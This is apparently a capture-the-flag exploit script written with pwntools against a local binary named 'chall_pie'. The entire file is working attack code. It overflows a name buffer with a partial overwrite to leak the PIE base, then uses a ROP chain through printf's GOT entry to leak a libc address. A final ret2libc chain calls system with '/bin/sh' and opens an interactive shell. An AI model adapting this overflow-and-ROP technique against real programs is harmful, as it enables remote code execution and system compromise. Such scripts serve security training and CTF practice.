from pwn import *

p = process("./chall_pie")
elf = ELF("./chall_pie")
libc = ELF("libc-2.33.so")
raw_input("DEBUG")

p.recvuntil("Enter your name: ")

pop_rdi = 0x0000000000001333
ret = 0x000000000000101a

payload = b"A"*232
payload += b"\x02"

p.send(payload)

leak_pie = u64(p.recv().ljust(8, b"\x00"))
elf.address = leak_pie - 0x1213
log.info("PIE address: "+ hex(elf.address))

payload2 = p64(elf.address+0x123b)
payload2 += p64(elf.address+pop_rdi)
payload2 += b"A"*7
payload2 += b"\xff"
payload2 += p64(elf.address+ret)
payload2 += p64(elf.address+ret)
payload2 += p64(elf.address+pop_rdi)
payload2 += p64(elf.got['printf'])
payload2 += p64(elf.sym['printf'])
payload2 += p64(elf.sym['main'])
payload2 += (256-len(payload2))*b"B"

payload2 += b"\x78"

p.send(payload2)

recieved = p.recvuntil("Enter your name: ", drop = True)
leak = u64(recieved.ljust(8, b"\x00"))
libc1 = leak - libc.sym['printf']
log.info("Leaked libc address: "+ hex(libc1))
bin_sh = libc1 + 0x198882

p.send(payload)

payload2 = p64(elf.address+0x123b)
payload2 += p64(elf.address+pop_rdi)
payload2 += b"A"*7
payload2 += b"\xff"
payload2 += p64(elf.address+ret)
payload2 += p64(elf.address+ret)
payload2 += p64(elf.address+pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(libc1 + libc.sym['system'])
payload2 += p64(libc1 +  libc.sym['exit'])
payload2 += (256-len(payload2))*b"A"

payload2 += b"\x78"

p.sendline(payload2)
p.recv()
p.interactive()	
